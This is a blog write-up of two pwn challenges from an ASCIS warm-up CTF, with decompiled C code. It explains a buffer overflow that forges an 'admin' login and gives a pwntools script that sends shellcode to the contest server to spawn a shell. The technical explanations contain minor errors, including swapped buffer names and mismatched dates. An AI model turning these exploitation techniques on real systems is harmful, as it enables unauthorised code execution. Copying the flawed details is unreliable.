---
title: "ASCIS warm up 2023 write up"
date: 2023-10-07T23:48:30+07:00
draft: false
tags: []
---

### Introduction

This is my write up for ASCIS warm up CTF 2021. I will only write about the pwn challenges.

### Challenge pwn 1

At first, i will check the properties of the binary file with checksec.

```
checksec --file=pwn
```

![checksec](/img/ascis-warm-up-write-up/checksec.png)

As you can see, the file is not protected by stack canary. So we can use buffer overflow to crack the program. I will use ghidra to decompile the binary file.

```c
void main(EVP_PKEY_CTX *param_1)

{
  int local_c;

  init(param_1);
  puts("Welcome to the Asean student\'s contest!");
  do {
    while( true ) {
      while( true ) {
        help();
        __isoc99_scanf(&DAT_00400d80,&local_c);
        if (local_c != 2) break;
        Signup();
      }
      if (2 < local_c) break;
      if (local_c == 1) {
        Login();
      }
      else {
LAB_00400ba5:
        puts("Thank you for your coming!!");
      }
    }
    if (local_c == 3) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (local_c != 4) goto LAB_00400ba5;
    getflag();
  } while( true );
}
```

The program is quite straight forward. There are four options for you to choose. The first option is to login. The second option is to signup. The third option is to exit the program. The last option is to get the flag.

Let's have a look in the getflag function.

```c
void getflag(void)

{
  int iVar1;
  char local_38 [44];
  int local_c;

  iVar1 = strcmp(&old_user,"admin");
  if (iVar1 != 0) {
    return;
  }
  local_c = open("/home/pwn01/flag",0);
  if (local_c == -1) {
    puts("Contact to author");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  read(local_c,local_38,0x1e);
  puts(local_38);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

From the given function, i can infer that the flag is stored in the file flag. The flag will be printed out if the username is admin. Furthermore, i found that the `&old_user` is the username that you are last signup.
So let dive into the signup function to make an admin account.

```c
undefined8 Signup(void)

{
  int iVar1;
  char local_88 [64];
  char local_48 [64];

  puts("Enter your username:");
  __isoc99_scanf(&DAT_00400c93,local_48);
  iVar1 = strcmp(local_48,"admin");
  if (iVar1 == 0) {
    puts("You can\'t register with admin");
  }
  else {
    iVar1 = strcmp(local_48,&old_user);
    if (iVar1 == 0) {
      puts("Username is already exists");
    }
    else {
      puts("Enter your passwd:");
      __isoc99_scanf(&DAT_00400c93,local_88);
      puts("Sign up success");
      memset(&old_user,0,0x32);
      memset(&old_passwd,0,0x32);
      strncpy(&old_user,local_48,0x32);
      strncpy(&old_passwd,local_88,0x32);
    }
  }
  return 0;
}
```

Just as i guessed, the program will block you from creating an admin account. However, the program doesn't check length of the username and password and if you look closely to the main program, you will see that the username (local_88) and password (local_48) are stored consecutively in the memory.

=> if we create a password with the length 64, we can overwrite the username with the password. Then we can login with the username admin and get the flag.

With that in mind, we could overflow the password with 64 characters of garbage and following is 'admin'.

![result](/img/ascis-warm-up-write-up/result.png)

### Challenge pwn 2

Chalenge 2 is a funnier. Let's check the properties of the binary file with checksec.

![checksec2](/img/ascis-warm-up-write-up/checksec2.png)

Stack canary and NX are disabled. So we can call the shellcode in the stack.

```c
int main(EVP_PKEY_CTX *param_1)

{
  size_t sVar1;
  char local_118 [208];
  undefined local_48 [64];

  init(param_1);
  puts("Welcome to the Asean student\'s contest!");
  printf("Give me your name: ");
  read(0,local_48,50);
  puts("What do you think about the contest (feedback) ?");
  read(0,local_118,100);
  sVar1 = strlen(local_118);
  if (sVar1 < 40) {
    puts("Feedback is too short");
    puts("Give more feedback to get more points");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Thank you for your feecback");
  puts("Have a nice day");
  getflag(local_118);
  return 0;
}
```

```c
void getflag(code *param_1)

{
  (*param_1)();
  return;
}
```

At the frist glance, when can see that the program will call the function getflag with the parameter is the feedback. The feedback is stored in the local_118 variable. The getflag function will call the feedback as a function. So we can call the shellcode in the feedback.

But there is a problem. The feedback must be longer than 40 characters. So we can't just put the shellcode in the feedback. We have to find a way to bypass the check.

```c
  sVar1 = strlen(local_118);
  if (sVar1 < 40) {
    puts("Feedback is too short");
    puts("Give more feedback to get more points");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
```

Since we can't padding with normal characters, we have to use nop sled. The nop sled is a series of nop instructions. The nop sled will slide to the shellcode and execute it.

```python
from pwn import *

context.binary = ELF('./pwn2')

p = remote('139.180.137.100', 1338)     # Connect to the server
payload = asm(shellcraft.sh())          # The shellcode provided by pwntools
payload += b'\x90'*20                   # Padding with nop sled
log.info(p.clean())

p.sendline('hiii there')
p.sendline(payload)
p.interactive()
```

![result2](/img/ascis-warm-up-write-up/result2.png)

And that is the result. You have succesfully get the shell.

Thanks for reading my write up. I hope you enjoy it.
